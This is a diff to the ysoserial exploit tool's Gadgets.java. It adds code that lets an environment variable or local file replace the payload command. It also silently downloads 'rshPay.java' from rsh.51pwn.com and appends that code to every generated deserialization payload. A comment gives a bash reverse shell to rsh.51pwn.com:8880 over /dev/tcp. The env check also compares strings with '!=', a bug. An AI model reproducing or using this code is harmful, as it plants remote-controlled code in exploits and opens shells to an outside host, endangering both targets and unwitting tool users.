@@ -3,12 +3,15 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
-import java.io.Serializable;
+import java.io.*;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,6 +27,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import javax.net.ssl.HttpsURLConnection;
 
 
 /*
@@ -114,9 +119,50 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        // sample cmd
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
             "\");";
+        // export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
+        // # 1 env
+        String szInjecting = "Custom_Code_51pwn";
+        String szEvCmd = System.getenv(szInjecting);
+        if(""!=szEvCmd){
+            cmd = szEvCmd;
+        }
+        // # 2 file
+        File file = new File(szInjecting);
+        if(file.exists()){
+            byte[] bytes = new byte[(int) file.length()];
+            FileInputStream fis = null;
+            try{
+                fis = new FileInputStream(file);
+                if (0 < fis.read(bytes)) {
+                    cmd = new String(bytes);
+                }
+            }catch (Exception e){}
+            finally {
+                if(null !=fis){fis.close();}
+            }
+        }
+        // # 3 url
+        String url = "https://rsh.51pwn.com/rshPay.java";
+        try {
+            URL httpsUrl = new URL(url);
+            HttpsURLConnection conn = (HttpsURLConnection) httpsUrl.openConnection();
+            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String inputLine;
+            StringBuilder sb = new StringBuilder();
+            while ((inputLine = br.readLine()) != null) {
+                sb.append(inputLine);
+            }
+            br.close();
+            String s1 =sb.toString();
+            if(0 < s1.length())
+                cmd += sb.toString();
+        } catch (IOException e) {
+        }
+
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
